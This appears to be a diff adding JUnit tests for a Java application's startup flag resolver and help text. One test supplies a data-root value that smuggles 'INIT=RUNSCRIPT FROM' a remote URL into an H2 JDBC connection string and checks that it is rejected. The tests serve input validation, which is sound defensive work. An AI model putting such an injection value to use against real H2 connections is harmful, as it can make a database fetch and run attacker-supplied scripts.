@@ -38,6 +38,18 @@ class StartupModeTest {
     }
 
     @Test
+    void dataRootThatWouldBreakTheJdbcUrlIsRejected() {
+        // ';' appends connection settings to an H2 URL (for example INIT=RUNSCRIPT)
+        assertThatThrownBy(() -> StartupModeResolver.resolve(new String[] {"--no-tenant"},
+                "C:/data;INIT=RUNSCRIPT FROM 'http://example.test/a.sql'", "default"))
+                .isInstanceOf(IllegalStateException.class)
+                .hasMessageContaining("data root");
+        assertThatThrownBy(() -> StartupModeResolver.resolve(new String[] {"--no-tenant"},
+                "./da'ta", "default"))
+                .isInstanceOf(IllegalStateException.class);
+    }
+
+    @Test
     void conflictingOrIncompleteFlagsFail() {
         assertThatThrownBy(() -> StartupModeResolver.resolve(
                 new String[] {"--tenant", "--no-tenant", "--tenant-id=a"}, "./data", "default"))
@@ -50,6 +62,37 @@ class StartupModeTest {
                 new String[] {"--tenant", "--tenant-id=Bad Id"}, "./data", "default"))
                 .isInstanceOf(IllegalStateException.class)
                 .hasMessageContaining("does not match");
+    }
+
+    @Test
+    void initDatabaseFlagIsRecognisedNextToTheModeFlags() {
+        var resolved = StartupModeResolver.resolve(
+                new String[] {"--tenant", "--tenant-id=hkex-otc", "--init-database"}, "./data", "default");
+        assertThat(resolved.initDatabase()).isTrue();
+        assertThat(resolved.tenantDirectory()).isEqualTo("./data/tenants/hkex-otc");
+
+        assertThat(StartupModeResolver.resolve(new String[] {"--no-tenant"}, "./data", "default")
+                .initDatabase()).isFalse();
+    }
+
+    @Test
+    void helpFlagWinsOverOtherFlags() {
+        assertThat(StartupHelp.requested(new String[] {"--help"})).isTrue();
+        assertThat(StartupHelp.requested(new String[] {"-h"})).isTrue();
+        assertThat(StartupHelp.requested(new String[] {"--tenant", "--help", "--init-database"})).isTrue();
+        assertThat(StartupHelp.requested(new String[] {"--tenant", "--tenant-id=a"})).isFalse();
+        assertThat(StartupHelp.requested(new String[] {})).isFalse();
+        assertThat(StartupHelp.text()).contains("--init-database", "--tenant-id", "--help", "--server.port");
+    }
+
+    @Test
+    void helpListsTheSupportedEnvironmentVariables() {
+        String text = StartupHelp.text();
+        assertThat(text).contains("Environment");
+        // only the variable the application reads itself is documented
+        assertThat(text).contains("APP_DATA_ROOT");
+        assertThat(text).doesNotContain("SPRING_PROFILES_ACTIVE", "SERVER_PORT", "APP_UI_SHOW_TENANT",
+                "APP_AUDIT_ENABLED", "APP_MODE / APP_TENANT_ID");
     }
 
     /**
